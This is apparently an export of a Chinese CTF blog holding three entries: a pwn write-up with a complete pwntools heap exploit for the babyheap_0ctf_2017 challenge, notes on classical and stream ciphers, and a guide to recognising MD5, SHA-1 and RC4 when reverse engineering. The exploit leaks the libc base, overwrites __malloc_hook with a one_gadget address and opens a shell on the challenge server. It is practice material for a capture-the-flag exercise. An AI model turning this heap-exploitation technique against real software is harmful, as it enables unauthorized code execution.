<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fanfan@ubuntu:~/pwn challenges/heap$ one_gadget libc-<span class="number">2.23</span>.so</span><br><span class="line"><span class="number">0x45226</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x30</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line"><span class="number">0x4527a</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x30</span>, environ)<span class="comment">#不知道什么问题，我的目标函数跑打不通，0x4526a则可以</span></span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x30</span>] == NULL</span><br><span class="line"></span><br><span class="line"><span class="number">0xf03a4</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x50</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x50</span>] == NULL</span><br><span class="line"></span><br><span class="line"><span class="number">0xf1247</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == NULL</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allo(<span class="number">79</span>)<span class="comment">#getshell</span></span><br></pre></td></tr></table></figure>

<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;babyheap_0ctf_2017&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29856</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allo</span>(<span class="params">size</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">allo(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>) <span class="comment"># 使2的chunk空闲块指向了4号块的位置,4号位为较大的chunk，用来获取目标地址</span></span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 让4号块的大小变成0x21，这样4号块就意义上被free了</span></span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1 The original position of 2 # 申请原本2号块</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2 4 Simultaneous pointing	# 这里就会申请到4号块的位置</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 将4号块的大小改回 0x91,不然找不到top chunk位置</span></span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x80</span>) <span class="comment"># 在申请一块大空间，避免4号块和top chunk合并</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)    <span class="comment"># 释放4号块</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">__malloc_hook = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line">libc_base = __malloc_hook - libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.info(<span class="string">&quot;__malloc_hook: &quot;</span>+ <span class="built_in">hex</span>(__malloc_hook))</span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span>+ <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># 相当于做一个切割，将0x80的块分成0x60在fastbin中，0x20在unsortedbin中</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(__malloc_hook - <span class="number">35</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>) <span class="comment"># 这个就会申请到假chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">79</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>刷题总结</category>
      </categories>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学基础</title>
    <url>/2023/07/17/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><h3 id="单表代换加密"><a href="#单表代换加密" class="headerlink" title="单表代换加密"></a>单表代换加密</h3><p>明密文一一对应，</p>
<ul>
<li>在密钥空间较小的情况下，采用暴力破解方式</li>
<li>在密文长度足够长的时候，使用词频分析，<a href="http://quipqiup.com/">http://quipqiup.com/</a></li>
</ul>
<p>当密钥空间足够大，而密文长度足够短的情况下，破解较为困难。</p>
<h4 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h4><p>基本破解：1）遍历26个偏移量2）利用词频分析(不一定得到正确的明文)</p>
<p>工具：1）JPK，可解带密钥与不带密钥2）<a href="http://planetcalc.com/1434/">http://planetcalc.com/1434/</a>   3）<a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a></p>
<h4 id="移位密码"><a href="#移位密码" class="headerlink" title="移位密码"></a>移位密码</h4><p>和凯撒密码的区别是在其不仅会处理字母，还会处理数字和特殊字符，常见的ascII码表进行移位</p>
<p>基本破解：遍历所有可能性进破解</p>
<h4 id="Atbash-Cipher"><a href="#Atbash-Cipher" class="headerlink" title="Atbash Cipher"></a>Atbash Cipher</h4><p>它使用字母表中的最后一个字母代表第一个字母，倒数第二个字母代表第二个字母</p>
<p>工具：<a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/">http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/</a></p>
<h4 id="简单替换密码"><a href="#简单替换密码" class="headerlink" title="简单替换密码"></a>简单替换密码</h4><p>将每个明文字母替换为与之唯一对应且不同的字母。它与恺撒密码之间的区别是其密码字母表的字母不是简单的移位，而是完全是混乱的，解密时，我们一般是知道了每一个字母的对应规则，才可以正常解密。一般采用词频分析。</p>
<p>工具：<a href="http://quipqiup.com/">http://quipqiup.com/</a></p>
<h4 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h4><p>加密函数是 E(x)&#x3D;(ax+b)(mod m)</p>
<p>解密函数是 D(x)&#x3D;a^(-1)(x−b)(mod m)</p>
<p>1）x 表示明文按照某种编码得到的数字2）a和 m互质3）m 是编码系统中字母的数目。</p>
<p>当a&#x3D;1 时，仿射加密是凯撒加密</p>
<h3 id="多表代换加密"><a href="#多表代换加密" class="headerlink" title="多表代换加密"></a>多表代换加密</h3><h4 id="playfair"><a href="#playfair" class="headerlink" title="playfair"></a>playfair</h4><p>基本算法，选取一串英文字母，除去重复出现的字母，将剩下的字母逐个逐个加入 5 × 5 的矩阵内，剩下的空间由未加入的英文字母依 a-z 的顺序加入。注意，将 q 去除，或将 i 和 j 视作同一字。将要加密的明文分成两个一组。若组内的字母相同，将 X（或 Q）加到该组的第一个字母后，重新分组。若剩下一个字，也加入 X 。在每组中，找出两个字母在矩阵中的地方，1）若两个字母不同行也不同列，在矩阵中找出另外两个字母（第一个字母对应行优先），使这四个字母成为一个长方形的四个角。2）若两个字母同行，取这两个字母右方的字母（若字母在最右方则取最左方的字母）。3）若两个字母同列，取这两个字母下方的字母（若字母在最下方则取最上方的字母）。</p>
<p>工具；CAP4</p>
<h4 id="polubius"><a href="#polubius" class="headerlink" title="polubius"></a>polubius</h4><p>棋盘密码，一般是将给定的明文加密为两两组合的数字，常用密码表5×5，26个字母依次填入，i&#x2F;j代表同一个，行和列的序号都是1~5。明文加密之后一个字母被加密成他的行列号。还有一种打乱的密码表</p>
<p>工具：CrypTool</p>
<h4 id="维吉尼亚"><a href="#维吉尼亚" class="headerlink" title="维吉尼亚"></a>维吉尼亚</h4><p>使用一系列凯撒密码组成密码字母表的加密算法，26×26，第一行偏移量为0，从A开始，第二行偏移为1，从B开始，偏移量依次加一，最后从Z开始。加密方式是先将密钥填充和明文一个长度，然后明文(行)和对应的密钥字母(列)在密码表中相交叉的位置的字母</p>
<p>已知密钥</p>
<p>1）Python 的 pycipher 库2）<a href="http://planetcalc.com/2468/">在线解密 Vigenère cipher</a>3）CAP4</p>
<p>未知密钥1）<a href="http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx">Vigenère Cipher Codebreaker</a>2）<a href="https://www.guballa.de/vigenere-solver">Vigenere Solver</a> </p>
<h4 id="nihilist"><a href="#nihilist" class="headerlink" title="nihilist"></a>nihilist</h4><p>关键词密码，利用密钥(关键词)构造棋盘矩阵5×5，将关键词不重复的依次填入矩阵，剩下字母按照字母顺序填入 ij等价。明文字母所在的行列号就是加密后的结果</p>
<h4 id="hill"><a href="#hill" class="headerlink" title="hill"></a>hill</h4><p>希尔密码，使用每个字母在字母表中的顺序作为其对应的数字，然后将明文转化为 n 维向量，跟一个 n × n 的矩阵相乘，再将得出的结果模 26。注意用作加密的矩阵（即密匙）在 Zn26 必须是可逆的，否则就不可能解码。只有矩阵的行列式和 26 互质，才是可逆的。</p>
<img src="https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图 2023-07-17 151502.png" style="zoom:50%;">

<p>工具 1)<a href="http://www.practicalcryptography.com/ciphers/hill-cipher/">http://www.practicalcryptography.com/ciphers/hill-cipher/</a>  2) CAP4  3) Cryptool</p>
<h4 id="autokeyipher"><a href="#autokeyipher" class="headerlink" title="autokeyipher"></a>autokeyipher</h4><p>自动密钥密码也是多表替换密码，与维吉尼亚密码密码类似,但是是用不同方式产生密钥。分为关键词自动密钥密码和原文自动密钥密码。加密方式和维吉尼亚加密方式一样</p>
<p>工具</p>
<p>已知关键词：Python 的 pycipher 库</p>
<p>未知关键词：<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/">http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/</a></p>
<h3 id="其他类型加密"><a href="#其他类型加密" class="headerlink" title="其他类型加密"></a>其他类型加密</h3><p>培根密码：<a href="http://rumkin.com/tools/cipher/baconian.php">http://rumkin.com/tools/cipher/baconian.php</a></p>
<p>栅栏密码：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p>
<p>曲路密码：</p>
<p>列移位相加：<a href="http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/">http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/</a> </p>
<p>01248密码：云影密码（只有 0，1，2，4，8）</p>
<p>JSfuck：<a href="http://www.jsfuck.com/">JSFuck 在线加密网站</a></p>
<p>BrainFuck：<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>
<p>猪圈密码：<a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html">http://www.simonsingh.net/The_Black_Chamber/pigpen.html</a></p>
<p>舞动的小人密码：</p>
<p>键盘密码</p>
<h2 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h2><p>流密码的密钥长度会与明文的长度相同,流密码的密钥派生自一个较短的密钥，派生算法通常为一个伪随机数生成算法。目前来说流加密都是对称加密。关键在于设计好的<strong>伪随机数生成器</strong>，流密码加解密非常简单，在已知明文的情况下，可以非常容易地获取密钥流。</p>
<h3 id="伪随机数生成器-PRNG"><a href="#伪随机数生成器-PRNG" class="headerlink" title="伪随机数生成器(PRNG)"></a>伪随机数生成器(PRNG)</h3><p>是用来生成接近于绝对随机数序列的数序列的算法。PRNG会依赖一个初始值(种子)，来生成伪随机数序列(种子确定，所生成的随机数序列就是确定的)</p>
<p><strong>密码安全伪随机数生成器(CSPRNG)<strong>，特殊的伪随机数生成器,生成的伪随机数应该满足更高的要求，</strong>比如当生成器的部分初始状态或者运行时的状态被攻击者获知时，攻击者仍然不能够获取泄漏状态之前的生成的随机数。</strong></p>
<h3 id="线性同余生成器-LCG"><a href="#线性同余生成器-LCG" class="headerlink" title="线性同余生成器(LCG)"></a>线性同余生成器(LCG)</h3><p>n级反馈移位寄存器，首先会有n个初态元素(a0，a1,,,,,an-1)，F是反馈函数和反馈逻辑，根据函数类型，可以分为线性反馈移位寄存器(LFSR)和非线性。</p>
<p>所以ai+n&#x3D;F(ai,ai+1,,,,,,ai+n-1)</p>
<p>反馈移位寄存器都会定义在某个有限域上,可以将其视为同一个空间中的变换，对于一个序列来说，我们一般定义其生成函数为其序列对应的<strong>幂级数</strong>的和。</p>
<h3 id="反馈移位寄存器"><a href="#反馈移位寄存器" class="headerlink" title="反馈移位寄存器"></a>反馈移位寄存器</h3><h3 id="特殊流密码"><a href="#特殊流密码" class="headerlink" title="特殊流密码"></a>特殊流密码</h3><h2 id="块加密"><a href="#块加密" class="headerlink" title="块加密"></a>块加密</h2><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><h2 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h2><h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><h2 id="攻击思想"><a href="#攻击思想" class="headerlink" title="攻击思想"></a>攻击思想</h2><h2 id="证书格式"><a href="#证书格式" class="headerlink" title="证书格式"></a>证书格式</h2>]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>密码分析</tag>
      </tags>
  </entry>
  <entry>
    <title>常见加密算法和编码识别</title>
    <url>/2023/04/10/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%92%8C%E7%BC%96%E7%A0%81%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<p>参考资料来自wiki</p>
<p>在对数据进行变换的过程中，除了简单的字节操作之外，还会使用一些常用的编码加密算法，因此如果能够快速识别出对应的编码或者加密算法，就能更快的分析出整个完整的算法。CTF 逆向中通常出现的加密算法包括 base64、TEA、AES、RC4、MD5 等。下面介绍一些实用的逆向分析技巧</p>
<h2 id="Hash算法"><a href="#Hash算法" class="headerlink" title="Hash算法"></a>Hash算法</h2><h3 id="1-MD5-PEID可以看到MD5"><a href="#1-MD5-PEID可以看到MD5" class="headerlink" title="1.MD5(PEID可以看到MD5)"></a>1.MD5(PEID可以看到MD5)</h3><p><strong>MD5 消息摘要算法</strong>（英语：MD5 Message-Digest Algorithm），一种被广泛使用的<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E9%9B%9C%E6%B9%8A%E5%87%BD%E6%95%B8">密码散列函数</a>，可以产生出一个 128 位（16 <a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82">字节</a>）的散列值（hash value），用于确保信息传输完整一致。</p>
<p>伪代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/<span class="title class_">Note</span>: <span class="title class_">All</span> variables are unsigned <span class="number">32</span> bits and wrap modulo <span class="number">2</span>^<span class="number">32</span> when calculating</span><br><span class="line"><span class="keyword">var</span> int[<span class="number">64</span>] r, k</span><br><span class="line"></span><br><span class="line"><span class="comment">//r specifies the per-round shift amounts</span></span><br><span class="line">r[ <span class="number">0.</span><span class="number">.15</span>]：= &#123;<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,  <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,  <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,  <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>&#125; </span><br><span class="line">r[<span class="number">16.</span><span class="number">.31</span>]：= &#123;<span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,  <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,  <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,  <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>&#125;</span><br><span class="line">r[<span class="number">32.</span><span class="number">.47</span>]：= &#123;<span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>&#125;</span><br><span class="line">r[<span class="number">48.</span><span class="number">.63</span>]：= &#123;<span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Use binary integer part of the sines of integers as constants:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">from</span> <span class="number">0</span> to <span class="number">63</span></span><br><span class="line">    k[i] := <span class="title function_">floor</span>(<span class="title function_">abs</span>(<span class="title function_">sin</span>(i + <span class="number">1</span>)) × <span class="number">2</span>^<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//Initialize variables:</span></span><br><span class="line"><span class="keyword">var</span> int h0 := <span class="number">0x67452301</span></span><br><span class="line"><span class="keyword">var</span> int h1 := <span class="number">0xEFCDAB89</span></span><br><span class="line"><span class="keyword">var</span> int h2 := <span class="number">0x98BADCFE</span></span><br><span class="line"><span class="keyword">var</span> int h3 := <span class="number">0x10325476</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Pre-processing:</span></span><br><span class="line">append <span class="string">&quot;1&quot;</span> bit to message</span><br><span class="line">append <span class="string">&quot;0&quot;</span> bits until message length <span class="keyword">in</span> bits ≡ <span class="number">448</span> (mod <span class="number">512</span>)</span><br><span class="line">append bit length <span class="keyword">of</span> message <span class="keyword">as</span> <span class="number">64</span>-bit little-endian integer to message</span><br><span class="line"></span><br><span class="line"><span class="comment">//Process the message in successive 512-bit chunks:</span></span><br><span class="line"><span class="keyword">for</span> each <span class="number">512</span>-bit chunk <span class="keyword">of</span> message</span><br><span class="line">    <span class="keyword">break</span> chunk into sixteen <span class="number">32</span>-bit little-endian words w[i], <span class="number">0</span> ≤ i ≤ <span class="number">15</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//Initialize hash value for this chunk:</span></span><br><span class="line">    <span class="keyword">var</span> int a := h0</span><br><span class="line">    <span class="keyword">var</span> int b := h1</span><br><span class="line">    <span class="keyword">var</span> int c := h2</span><br><span class="line">    <span class="keyword">var</span> int d := h3</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Main loop:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">from</span> <span class="number">0</span> to <span class="number">63</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> ≤ i ≤ <span class="number">15</span> then</span><br><span class="line">            f := (b and c) or ((not b) and d)</span><br><span class="line">            g := i</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> <span class="number">16</span> ≤ i ≤ <span class="number">31</span></span><br><span class="line">            f := (d and b) or ((not d) and c)</span><br><span class="line">            g := (<span class="number">5</span>×i + <span class="number">1</span>) mod <span class="number">16</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> <span class="number">32</span> ≤ i ≤ <span class="number">47</span></span><br><span class="line">            f := b xor c xor d</span><br><span class="line">            g := (<span class="number">3</span>×i + <span class="number">5</span>) mod <span class="number">16</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> <span class="number">48</span> ≤ i ≤ <span class="number">63</span></span><br><span class="line">            f := c xor (b or (not d))</span><br><span class="line">            g := (<span class="number">7</span>×i) mod <span class="number">16</span></span><br><span class="line"></span><br><span class="line">        temp := d</span><br><span class="line">        d := c</span><br><span class="line">        c := b</span><br><span class="line">        b := <span class="title function_">leftrotate</span>((a + f + k[i] + w[g]),r[i]) + b</span><br><span class="line">        a := temp</span><br><span class="line">    <span class="title class_">Next</span> i</span><br><span class="line">    <span class="comment">//Add this chunk&#x27;s hash to result so far:</span></span><br><span class="line">    h0 := h0 + a</span><br><span class="line">    h1 := h1 + b </span><br><span class="line">    h2 := h2 + c</span><br><span class="line">    h3 := h3 + d</span><br><span class="line"><span class="title class_">End</span> <span class="title class_">ForEach</span></span><br><span class="line"><span class="keyword">var</span> int digest := h0 append h1 append h2 append h3 <span class="comment">//(expressed as little-endian)</span></span><br></pre></td></tr></table></figure>



<p>MD5的源码满天飞，最好识别的一个特色就是，MD5算法需要初始化4个32位的常数，用16进制表示</p>
<blockquote>
<p>h0 &#x3D; 0x67452301;   </p>
<p>h1 &#x3D; 0xefcdab89;  </p>
<p>h2 &#x3D; 0x98badcfe;    </p>
<p>h3 &#x3D; 0x10325476;</p>
</blockquote>
<p>如果看到有4个类似的16进制数，可以重点怀疑</p>
<p>第二个特点就是MD5算法会用到abs(sin(i))函数的值，这个函数的值可以查表去了解一些常见的，如果在逆向分析程序时又看到这个函数的值，那么也可以帮助你判断这是MD5</p>
<h3 id="2-SHA-1-用PEID可看到SHA-1"><a href="#2-SHA-1-用PEID可看到SHA-1" class="headerlink" title="2.SHA-1(用PEID可看到SHA-1)"></a>2.SHA-1(用PEID可看到SHA-1)</h3><p>SHA-1和MD5类似，特色就是要初始化一些常数，SHA-1要初始化5个32位16进制数</p>
<blockquote>
<p>h0:&#x3D; 0x67452301  </p>
<p>h1:&#x3D; 0xEFCDAB89  </p>
<p>h2:&#x3D; 0x98BADCFE  </p>
<p>h3:&#x3D; 0x10325476  </p>
<p>h4:&#x3D; 0xC3D2E1F0</p>
</blockquote>
<p>同理SHA-256、SHA-384、SHA-512也有对应的初始化数据，这里就不一一列举了</p>
<h2 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h2><h3 id="1-RC4"><a href="#1-RC4" class="headerlink" title="1.RC4"></a>1.RC4</h3><p>在<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a>中，<strong>RC4</strong>（来自 Rivest Cipher 4 的缩写）是一种<a href="https://zh.wikipedia.org/wiki/%E6%B5%81%E5%8A%A0%E5%AF%86">流加密</a>算法，<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E9%92%A5">密钥</a>长度可变。它加解密使用相同的密钥，因此属于<a href="https://zh.wikipedia.org/wiki/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86">对称加密算法</a>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *s, <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">unsigned</span> <span class="type">long</span> Len)</span> <span class="comment">//初始化函数</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i =<span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> k[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *s, <span class="type">unsigned</span> <span class="type">char</span> *Data, <span class="type">unsigned</span> <span class="type">long</span> Len)</span> <span class="comment">//加解密</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++) &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">     &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>通过分析初始化代码，可以看出初始化代码中，对字符数组 s 进行了初始化赋值，且赋值分别递增。之后对 s 进行了 256 次交换操作。通过识别初始化代码，可以知道 rc4 算法。</p>
<p>其伪代码表示为：</p>
<p>初始化长度为 256 的 <a href="https://zh.wikipedia.org/wiki/S%E7%9B%92">S 盒</a>。第一个 for 循环将 0 到 255 的互不重复的元素装入 S 盒。第二个 for 循环根据密钥打乱 S 盒。</p>
